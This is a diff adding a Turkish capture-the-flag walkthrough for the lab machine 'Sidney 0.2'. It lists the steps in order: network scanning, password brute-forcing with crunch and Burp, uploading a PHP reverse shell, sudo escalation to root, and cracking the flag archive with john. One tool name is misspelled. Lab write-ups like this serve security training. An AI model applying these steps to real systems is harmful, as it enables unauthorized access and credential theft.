@@ -1,0 +1,18 @@
+SIDNEY: 0.2 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.131 bulundu.
+2 - nmap -sT -A 192.168.2.131
+3 - view-source:http://192.168.2.131/commodore64/,  robhubbard:XXX0000 -> PASSWORD
+4 - gobuster dir -u http://192.168.2.131/commodore64 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+5 - http://192.168.2.131/commodore64/index.php
+6 - crunch 7 7 -t mos%%%% -o sidney_crunch.txt
+7 - Burp Suite -> Sniper -> robhubbard:mos6518
+8 - cp /usr/share/webshells/php/php-reverse-shell.php .
+9 - http://192.168.2.131/commodore64/php-reverse-shell.php
+10 - su rhubbard
+11 - sudo -l, sudo su, cd /root
+12 - ls -la, cd .commodore64, cd .miami, cd vice
+13 - cp flag.zip /var/www/html/commodore64
+14 - http://192.168.2.131/commodore64/index.php?&&path=&filename=flag.zip&action=download
+15 - zip2hjohn flag.zip > hash
+16 - john hash -w=/usr/share/wordlists/rockyou.txt
+17 - cat flag.txt
